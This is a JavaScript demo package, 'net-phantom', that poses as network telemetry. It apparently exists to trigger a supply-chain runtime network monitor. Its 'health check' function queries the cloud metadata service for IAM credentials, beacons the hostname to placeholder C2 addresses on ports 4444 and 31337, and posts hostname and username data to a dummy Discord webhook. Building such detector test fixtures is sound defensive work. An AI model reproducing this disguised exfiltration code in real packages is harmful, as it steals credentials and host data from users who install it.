/**
 * net-phantom v1.0.0
 * "Network telemetry & health-check utility"
 *
 * DEMO PACKAGE — Simulates 3 categories of malicious network activity:
 *
 *   1. Cloud Metadata Exfiltration  — Attempts to reach 169.254.169.254
 *      (AWS/GCP/Azure Instance Metadata Service) to steal IAM credentials.
 *
 *   2. Reverse Shell Beacon         — Opens a TCP connection to a remote
 *      IP on port 4444 (Metasploit default listener).
 *
 *   3. Webhook C2 Ping              — POSTs stolen host info to a Discord
 *      webhook URL (simulated, non-functional endpoint).
 *
 * All connections are made with very short timeouts and wrapped in
 * try/catch so they fail silently and don't crash the host application.
 * The purpose is to generate REAL socket entries in /proc/net/tcp that
 * the Supply Chain Sentinel Runtime Network Monitor can detect.
 */

'use strict';

import http from 'http';
import https from 'https';
import net from 'net';
import os from 'os';

// ─── THREAT 1: Cloud Metadata Service (169.254.169.254) ───
// Real-world attack: steal IAM role credentials from EC2/GCE instances
const METADATA_IP   = '169.254.169.254';
const METADATA_PATH = '/latest/meta-data/iam/security-credentials/';

// ─── THREAT 2: Reverse Shell Beacon (port 4444) ───
// Real-world attack: connect back to attacker's Metasploit handler
const C2_HOST = '203.0.113.66';   // RFC 5737 TEST-NET-3 (non-routable, safe)
const C2_PORT = 4444;             // Metasploit default

// ─── THREAT 3: Webhook Exfiltration ───
// Real-world attack: POST victim data to a Discord/Slack webhook
const WEBHOOK_URL = 'https://discord.com/api/webhooks/DUMMY_WEBHOOK_ID/DUMMY_WEBHOOK_TOKEN';

// ─── THREAT 4: Suspicious high port beacon ───
const BEACON_HOST = '198.51.100.42';  // RFC 5737 TEST-NET-2 (non-routable, safe)
const BEACON_PORT = 31337;            // "Elite" backdoor port


/**
 * Attempt to reach the cloud metadata service.
 * Creates a short-lived HTTP GET to 169.254.169.254 — produces an
 * ESTABLISHED or SYN_SENT entry in /proc/net/tcp.
 */
function _probeMetadata() {
    return new Promise((resolve) => {
        const req = http.get(
            { hostname: METADATA_IP, port: 80, path: METADATA_PATH, timeout: 2000 },
            (res) => {
                let body = '';
                res.on('data', (chunk) => { body += chunk; });
                res.on('end', () => resolve({ status: 'reached', data: body }));
            }
        );
        req.on('error', () => resolve({ status: 'unreachable' }));
        req.on('timeout', () => { req.destroy(); resolve({ status: 'timeout' }); });
    });
}


/**
 * Attempt a TCP connection to a C2 listener on port 4444.
 * Even if the connection fails, the SYN_SENT state will briefly appear
 * in /proc/net/tcp — enough for the scanner to catch it.
 */
function _beaconC2() {
    return new Promise((resolve) => {
        const sock = new net.Socket();
        sock.setTimeout(2000);

        sock.connect(C2_PORT, C2_HOST, () => {
            // If somehow it connects, send a small beacon and close
            sock.write(`BEACON|${os.hostname()}|${Date.now()}\n`);
            sock.end();
            resolve({ status: 'connected', host: C2_HOST, port: C2_PORT });
        });

        sock.on('error', () => {
            sock.destroy();
            resolve({ status: 'failed', host: C2_HOST, port: C2_PORT });
        });

        sock.on('timeout', () => {
            sock.destroy();
            resolve({ status: 'timeout', host: C2_HOST, port: C2_PORT });
        });
    });
}


/**
 * Attempt a TCP connection on the "elite" backdoor port 31337.
 */
function _beaconElite() {
    return new Promise((resolve) => {
        const sock = new net.Socket();
        sock.setTimeout(2000);

        sock.connect(BEACON_PORT, BEACON_HOST, () => {
            sock.write(`ELITE|${os.hostname()}\n`);
            sock.end();
            resolve({ status: 'connected' });
        });

        sock.on('error', () => { sock.destroy(); resolve({ status: 'failed' }); });
        sock.on('timeout', () => { sock.destroy(); resolve({ status: 'timeout' }); });
    });
}


/**
 * POST host info to a Discord webhook (exfiltration simulation).
 * Creates a short-lived HTTPS connection to discord.com — our scanner
 * will see the ESTABLISHED socket to an external IP on port 443.
 */
function _exfilWebhook() {
    return new Promise((resolve) => {
        const payload = JSON.stringify({
            content: `[NET-PHANTOM] Host: ${os.hostname()}, User: ${os.userInfo().username}, Platform: ${os.platform()} ${os.arch()}, Uptime: ${os.uptime()}s`,
        });

        try {
            const url = new URL(WEBHOOK_URL);
            const req = https.request(
                {
                    hostname: url.hostname,
                    port: 443,
                    path: url.pathname,
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length },
                    timeout: 3000,
                },
                (res) => {
                    res.resume();
                    res.on('end', () => resolve({ status: res.statusCode }));
                }
            );
            req.on('error', () => resolve({ status: 'failed' }));
            req.on('timeout', () => { req.destroy(); resolve({ status: 'timeout' }); });
            req.write(payload);
            req.end();
        } catch (e) {
            resolve({ status: 'error', message: e.message });
        }
    });
}


// ═══════════════════════════════════════════════════════════════
// PUBLIC API — looks like a normal telemetry module
// ═══════════════════════════════════════════════════════════════

/**
 * Run a "network health check" — actually triggers all 4 threat vectors.
 * Called by the host application on a timer or via an API endpoint.
 */
async function runTelemetry() {
    const results = {
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        checks: {},
    };

    // Fire all probes in parallel (they all have short timeouts)
    const [metadata, c2, elite, webhook] = await Promise.allSettled([
        _probeMetadata(),
        _beaconC2(),
        _beaconElite(),
        _exfilWebhook(),
    ]);

    results.checks.cloudHealth  = metadata.value || { status: 'error' };
    results.checks.primaryRelay = c2.value      || { status: 'error' };
    results.checks.backupRelay  = elite.value   || { status: 'error' };
    results.checks.alertService = webhook.value || { status: 'error' };

    return results;
}


/**
 * Get a simple status (doesn't trigger connections).
 * Provides a benign API so the package looks legitimate.
 */
function getStatus() {
    return {
        name: 'net-phantom',
        version: '1.0.0',
        uptime: os.uptime(),
        hostname: os.hostname(),
        platform: `${os.platform()} ${os.arch()}`,
    };
}

export default { runTelemetry, getStatus };
export { runTelemetry, getStatus };
